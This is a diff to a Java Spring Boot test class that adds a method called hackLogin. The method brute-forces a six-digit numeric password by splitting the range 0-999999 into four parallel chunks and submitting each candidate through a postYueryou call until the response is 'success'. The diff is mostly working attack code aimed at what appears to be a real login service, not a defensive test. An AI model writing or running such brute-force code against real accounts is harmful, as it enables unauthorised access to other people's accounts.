@@ -11,6 +11,13 @@ import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.boot.test.context.SpringBootTest;
 import org.springframework.test.context.junit4.SpringRunner;
 
+import java.util.Arrays;
+import java.util.List;
+import java.util.concurrent.CompletableFuture;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.Executor;
+import java.util.stream.Collectors;
+
 @RunWith(SpringRunner.class)
 @SpringBootTest(classes = dalTest.class)
 @SpringBootApplication(scanBasePackages = {"cn.colams"})
@@ -26,14 +33,41 @@ public class YueryouBizTest {
             {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
 
     @Autowired
+    Executor taskExecutor;
+
+    @Autowired
     YueryouBiz yueryouBiz;
 
     @Test
-    public void testPostYueryou() {
+    public void testPostYueryou() throws ExecutionException, InterruptedException {
+        String result = hackLogin();
+        logger.info(result);
+    }
 
-        char[] charArray = new char[4];
+    private String hackLogin() throws ExecutionException, InterruptedException {
 
-        for (int i = 236; i <= 9999; i++) {
+        StringBuilder result = new StringBuilder();
+
+        List<String> stepList = Arrays.asList("0-250000", "250001-500000", "500001-750000", "750001-999999");
+//        List<String> stepList = Arrays.asList("0-250000");
+        List<CompletableFuture<String>> futures = stepList.stream()
+                .map(e -> CompletableFuture.supplyAsync(() ->
+                                loopHackLogin(e),
+                        taskExecutor))
+                .collect(Collectors.toList());
+        for (int i = 0; i < futures.size(); i++) {
+            String res = futures.get(i).get();
+            result.append(res);
+        }
+        return result.toString();
+    }
+
+    private String loopHackLogin(String step) {
+        List<Integer> array = Arrays.stream(step.split("-")).map(e -> Integer.valueOf(e)).collect(Collectors.toList());
+
+        char[] charArray = new char[6];
+        String password = null;
+        for (int i = array.get(0); i <= array.get(1); i++) {
             String tem = String.valueOf(i);
             char[] tempChar = tem.toCharArray();
             int n = charArray.length - tempChar.length;
@@ -49,15 +83,18 @@ public class YueryouBizTest {
             } else {
                 charArray = tempChar;
             }
-            char[] charArrayTemp = initCharArrayTemp(charArray);
-            String pwd = String.copyValueOf(charArrayTemp);
+            //            char[] charArrayTemp = initCharArrayTemp(charArray);
+            String pwd = String.copyValueOf(charArray);
             String result = yueryouBiz.postYueryou(pwd);
             logger.info(result);
             if (result.equalsIgnoreCase("success")) {
+                password = pwd;
                 break;
             }
         }
+        return password;
     }
+
 
     private char[] initCharArrayTemp(char[] charArray) {
         char[] charArrayTemp = new char[6];
